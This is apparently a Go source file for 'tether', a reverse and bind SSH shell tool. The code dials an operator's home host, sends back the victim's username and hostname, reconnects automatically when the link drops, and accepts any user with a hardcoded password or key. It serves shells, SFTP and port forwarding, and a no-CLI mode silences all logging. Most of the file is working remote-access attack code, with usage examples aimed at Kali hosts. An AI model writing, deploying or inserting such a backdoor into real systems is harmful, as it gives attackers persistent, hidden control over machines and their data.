package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"os/user"
	"path"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type params struct {
	LUSER        string
	LHOST        string
	LPORT        uint
	homeBindPort uint
	listen       bool
	shell        string
	noShell      bool
	verbose      bool
}

func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		if forbidden {
			log.Printf("Denying local port forwarding request %s:%d", dhost, dport)
			return false
		}
		log.Printf("Accepted forward to %s:%d", dhost, dport)
		return true
	}
}

func createReversePortForwardingCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		log.Printf("Attempt to bind at %s:%d granted", host, port)
		return true
	}
}

func createSessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		if forbidden {
			log.Println("Denying shell/exec/subsystem request")
			return false
		}
		return true
	}
}

func createPasswordHandler(localPassword string) ssh.PasswordHandler {
	return func(ctx ssh.Context, pass string) bool {
		passed := pass == localPassword
		if passed {
			log.Printf("Successful authentication with password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			log.Printf("Invalid password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createPublicKeyHandler(authorizedKey string) ssh.PublicKeyHandler {
	if authorizedKey == "" {
		return nil
	}

	return func(ctx ssh.Context, key ssh.PublicKey) bool {
		master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
		if err != nil {
			log.Println("Encountered error while parsing public key:", err)
			return false
		}
		passed := bytes.Equal(key.Marshal(), master.Marshal())
		if passed {
			log.Printf("Successful authentication with ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			log.Printf("Invalid ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createSFTPHandler() ssh.SubsystemHandler {
	return func(s ssh.Session) {
		server, err := sftp.NewServer(s)
		if err != nil {
			log.Printf("Sftp server init error: %s\n", err)
			return
		}

		log.Printf("New sftp connection from %s", s.RemoteAddr().String())
		if err := server.Serve(); err == io.EOF {
			server.Close()
			log.Println("Sftp connection closed by client")
		} else if err != nil {
			log.Println("Sftp server exited with error:", err)
		}
	}
}

func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
	var (
		err    error
		client *gossh.Client
	)

	config := &gossh.ClientConfig{
		User: username,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for password on failure
	for {
		client, err = gossh.Dial("tcp", address, config)
		if err == nil {
			break
		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
			fmt.Println("Enter password:")
			data, err := term.ReadPassword(int(syscall.Stdin))
			if err != nil {
				log.Println(err)
				continue
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
		} else {
			return nil, err
		}
	}

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
	if err != nil {
		return nil, err
	}
	log.Printf("Success: listening at home on %s", ln.Addr().String())

	// Attempt to send extra info back home in the info message of an extra ssh channel
	sendExtraInfo(client, ln.Addr().String())

	// Detect a dead home connection so run() can reconnect: a failed keepalive
	// closes the client, which makes ln.Accept (and thus server.Serve) return.
	go keepAlive(client)

	return ln, nil
}

// keepAlive sends periodic keepalive requests over the home connection.
// If one fails the underlying client is closed, which unblocks server.Serve
// and lets the reverse-mode loop dial home again.
func keepAlive(client *gossh.Client) {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if _, _, err := client.SendRequest("keepalive@openssh.com", true, nil); err != nil {
			log.Printf("Keepalive failed, dropping home connection: %v", err)
			client.Close()
			return
		}
	}
}

type ExtraInfo struct {
	CurrentUser      string
	Hostname         string
	ListeningAddress string
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {

	extraInfo := ExtraInfo{ListeningAddress: listeningAddress}

	if usr, err := user.Current(); err != nil {
		extraInfo.CurrentUser = "ERROR"
	} else {
		extraInfo.CurrentUser = usr.Username
	}
	if hostname, err := os.Hostname(); err != nil {
		extraInfo.Hostname = "ERROR"
	} else {
		extraInfo.Hostname = hostname
	}

	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&extraInfo))
	// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
		log.Printf("Could not create info channel: %+v", err)
	}
	// If the channel is actually accepted, just close it again
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

func createExtraInfoHandler() ssh.ChannelHandler {
	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
		var extraInfo ExtraInfo
		err := gossh.Unmarshal(newChan.ExtraData(), &extraInfo)
		newChan.Reject(gossh.Prohibited, "th4nkz")
		if err != nil {
			log.Printf("Could not parse extra info from %s", conn.RemoteAddr())
			return
		}
		log.Printf(
			"New connection from %s: %s on %s reachable via %s",
			conn.RemoteAddr(),
			extraInfo.CurrentUser,
			extraInfo.Hostname,
			extraInfo.ListeningAddress,
		)
	}
}

func setupParameters(noCLI string) *params {
	if noCLI != "" {
		return setupParametersWithoutCLI()
	}

	var help = fmt.Sprintf(`tether v%[2]s  Copyright (C) 2026 Darkcast

Usage: %[1]s [options] [[<user>@]<target>]

Examples:
  Bind:
	%[1]s -l
	%[1]s -v -l -p 4444
  Reverse:
	%[1]s 192.168.0.1
	%[1]s kali@192.168.0.1
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-l, Start tether in listening mode (overrides reverse scenario)
	-p, Port at which tether is listening for incoming ssh connections (bind scenario)
		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
		(if only remote port forwarding is needed, e.g. when catching reverse connections)
	-v, Emit log output
	-V, Print version and exit

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user other than '%[8]s' while dialling home

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)

	flag.Usage = func() {
		fmt.Print(help)
		os.Exit(1)
	}

	p := params{}

	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert LPORT: ", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert BPORT: ", err)
	}
	flag.UintVar(&p.LPORT, "p", uint(lport), "")
	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
	flag.BoolVar(&p.listen, "l", false, "")
	flag.StringVar(&p.shell, "s", defaultShell, "")
	flag.BoolVar(&p.noShell, "N", false, "")
	flag.BoolVar(&p.verbose, "v", false, "")
	var showVersion bool
	flag.BoolVar(&showVersion, "V", false, "")
	flag.Parse()

	if showVersion {
		fmt.Printf("tether v%s\n", version)
		os.Exit(0)
	}

	if !p.verbose {
		log.SetOutput(io.Discard)
	}

	switch len(flag.Args()) {
	case 0:
		p.LUSER = LUSER
		p.LHOST = LHOST
	case 1:
		target := strings.Split(flag.Args()[0], "@")
		switch len(target) {
		case 1:
			p.LUSER = LUSER
			p.LHOST = target[0]
		case 2:
			p.LUSER = target[0]
			p.LHOST = target[1]
		default:
			log.Fatalf("Could not parse '%s'", target)
		}

	default:
		log.Println("Invalid arguments, check usage!")
		os.Exit(1)
	}

	return &p
}

func setupParametersWithoutCLI() *params {
	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert LPORT: ", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert BPORT: ", err)
	}

	log.SetOutput(io.Discard)

	return &params{
		LUSER:        LUSER,
		LHOST:        LHOST,
		LPORT:        uint(lport),
		homeBindPort: uint(homeBindPort),
		listen:       false,
		shell:        defaultShell,
		noShell:      false,
		verbose:      false,
	}
}

func run(p *params, server *ssh.Server) {
	// Shut down cleanly on Ctrl-C / SIGTERM instead of leaving sessions dangling.
	var shuttingDown atomic.Bool
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigs
		shuttingDown.Store(true)
		log.Println("Received signal, shutting down")
		server.Close()
	}()

	// Bind scenario: listen locally and serve until closed.
	if p.listen || p.LHOST == "" {
		log.Printf("Starting ssh server on :%d", p.LPORT)
		ln, err := net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Success: listening on %s", ln.Addr().String())
		defer ln.Close()
		if err := server.Serve(ln); err != nil && err != ssh.ErrServerClosed {
			log.Fatal(err)
		}
		return
	}

	// Reverse scenario: keep dialling home and reconnect whenever the
	// connection drops, backing off exponentially between failed attempts.
	target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
	const (
		minBackoff = 1 * time.Second
		maxBackoff = 30 * time.Second
	)
	backoff := minBackoff

	for !shuttingDown.Load() {
		log.Printf("Dialling home via ssh to %s", target)
		ln, err := dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
		if err != nil {
			if shuttingDown.Load() {
				break
			}
			log.Printf("Dial home failed: %v; retrying in %s", err, backoff)
			time.Sleep(backoff)
			if backoff *= 2; backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}

		// Connected: reset backoff and serve until the home link drops.
		backoff = minBackoff
		err = server.Serve(ln)
		ln.Close()
		if shuttingDown.Load() || err == ssh.ErrServerClosed {
			break
		}
		log.Printf("Home connection lost (%v); reconnecting", err)
	}
}
